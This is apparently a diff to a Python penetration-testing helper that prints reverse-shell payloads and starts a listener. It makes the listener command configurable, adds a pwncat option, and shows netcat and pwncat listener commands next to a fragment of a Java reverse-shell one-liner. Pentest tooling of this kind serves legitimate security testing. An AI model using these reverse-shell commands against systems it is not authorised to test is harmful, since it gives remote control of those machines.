@@ -62,7 +62,15 @@ def ask_listener():
     return ipp, port
 
 
-def shell():
+def shell(listener: str='nc -lvnp yyy'):
+    """
+    Print information on how to spawn a reverse shell and start a listener.
+
+    Params
+    ------
+    listener : str='nc -lvnp yyy'
+        Optionally define the listener command to use instead of `nc -lvnp yyy` (yyy will be replaced by the port)
+    """
     ipp, port = ask_listener()
 
     # Keeping with the random colors, but adding color coding for different OS
@@ -180,7 +188,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
     command = []
     if os.geteuid() != 0 and int(port) < 1024:
         command.append('sudo')
-    command.extend(['nc', '-lvnp', port])
+    command.extend(listener.replace('yyy', port).split(' '))
     Popen(command).communicate()
 
 
@@ -330,11 +338,13 @@ def banner():
 
 def main(arg):
     parser = argparse.ArgumentParser()
-    parser.add_argument('use', help='msf|shell')
+    parser.add_argument('use', help='msf|shell|pwncat')
     args = parser.parse_args()
     banner()
     if args.use == 'shell':
         shell()
+    elif args.use == 'pwncat':
+        shell('pwncat --listen --port yyy')
     elif args.use == 'msf':
         payload()
     elif args.use != 'shell' and args.use != 'msf':
